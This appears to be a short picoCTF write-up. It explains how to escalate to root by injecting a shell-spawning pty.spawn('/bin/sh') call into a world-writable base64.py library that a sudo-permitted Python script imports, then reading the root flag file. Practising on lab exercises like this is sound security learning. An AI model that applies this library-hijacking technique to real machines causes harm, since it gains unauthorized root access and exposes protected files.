ssh into the machine

picoctf user can run python3 /home/picoctf/.server.py as sudo
you can check it by running sudo -l

look at the libs on /usr/llib/python3.8
base64 has 777 permissions

so we just need to spawn a shell inside the base64.py file:

import pty
pty.spawn("/bin/sh")

then just cat /root/.flag.txt
